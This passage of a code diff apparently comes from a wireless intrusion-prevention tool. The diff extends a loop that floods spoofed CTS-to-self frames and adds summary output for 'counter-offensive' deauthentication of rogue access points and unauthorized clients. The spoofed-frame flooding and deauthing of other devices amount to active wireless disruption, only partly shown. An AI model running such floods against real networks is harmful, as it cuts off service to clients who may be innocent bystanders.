-        """Flood CTS-to-self frames spoofed from rogue BSSIDs to inject
-        latency into their client communications."""
+        """Flood CTS-to-self frames spoofed from rogue BSSIDs and from
+        protected BSSIDs under deauth attack (NAV reservation defense)."""
         while not stop_event.is_set():
             with lock:
                 targets = list(rogue_bssids)
-            if not targets:
+            # Also protect BSSIDs under deauth attack with CTS-to-self
+            with deauth_defense_lock:
+                defense_targets = list(deauth_defense_bssids)
+            combined = list(set(targets) | set(defense_targets))
+            if not combined:
                 time.sleep(2)
                 continue
 
-            for bssid in targets:
+            for bssid in combined:
                 if stop_event.is_set():
                     return
                 cts = RadioTap() / Dot11(
@@ -1085,6 +1609,36 @@ def mode_rogue_detect(capture_iface, replay_iface, use_5ghz=False):
                 for b in sorted(bh_set):
                     b_ssid = bssid_names.get(b, "<hidden>")
                     print(colored("      └─ {} ({})".format(b, b_ssid), "white"))
+        # Deauth defense summary
+        with deauth_defense_lock:
+            defense_attacker_count = len(deauth_attackers)
+            defense_bssid_count = len(deauth_defense_bssids)
+            defense_snapshot = {
+                a: {"targets": list(info["targets"]), "clients": list(info["clients"])}
+                for a, info in deauth_attackers.items()
+            }
+        if defense_attacker_count:
+            print(colored(
+                "[*] Deauth defense: {} attacker(s) countered, {} BSSID(s) protected with CTS-to-self".format(
+                    defense_attacker_count, defense_bssid_count),
+                "red", attrs=["bold"],
+            ))
+            for atk_mac, info in sorted(defense_snapshot.items()):
+                targets_str = ", ".join(info["targets"])
+                victims_str = ", ".join(info["clients"]) if info["clients"] else "broadcast"
+                print(colored("    Attacker {} → target(s): {}".format(atk_mac, targets_str), "red"))
+                print(colored("      Victim(s): {}".format(victims_str), "yellow"))
+        spoofed_cnt = spoofed_deauth_count[0]
+        spoofed_bssids = list(spoofed_deauth_log.keys())
+        if spoofed_cnt:
+            print(colored(
+                "[*] Spoofed deauth: {} flood(s) detected on {} BSSID(s), CTS-to-self engaged".format(
+                    spoofed_cnt, len(spoofed_bssids)),
+                "red", attrs=["bold"],
+            ))
+            for sb in sorted(spoofed_bssids):
+                sb_ssid = bssid_names.get(sb, "<hidden>")
+                print(colored("    └─ {} ({})".format(sb, sb_ssid), "yellow"))
         if rogue_count:
             print(colored(
                 "[*] Counter-offensive: {} rogue AP(s), {} client(s) under deauth + latency".format(
@@ -1094,6 +1648,23 @@ def mode_rogue_detect(capture_iface, replay_iface, use_5ghz=False):
             for r_bssid, info in sorted(rogue_snapshot.items()):
                 print(colored("    Rogue AP {} ({})".format(r_bssid, info["ssid"]), "red") +
                       colored(" — {} client(s)".format(len(info["clients"])), "white"))
+                for c in sorted(info["clients"]):
+                    print("        └─ " + c)
+        # Unauthorized client summary
+        with unauth_lock:
+            u_count = unauth_client_count[0]
+            unauth_snapshot = {
+                b: {"ssid": info["ssid"], "clients": list(info["clients"])}
+                for b, info in unauth_clients.items()
+            }
+        if u_count:
+            print(colored(
+                "[*] Unauthorized clients: {} client(s) deauthed from whitelisted BSSID(s)".format(u_count),
+                "red", attrs=["bold"],
+            ))
+            for ub, info in sorted(unauth_snapshot.items()):
+                print(colored("    AP {} ({})".format(ub, info["ssid"]), "cyan") +
+                      colored(" — {} unauthorized".format(len(info["clients"])), "red"))
                 for c in sorted(info["clients"]):
                     print("        └─ " + c)
         if relay_snapshot:
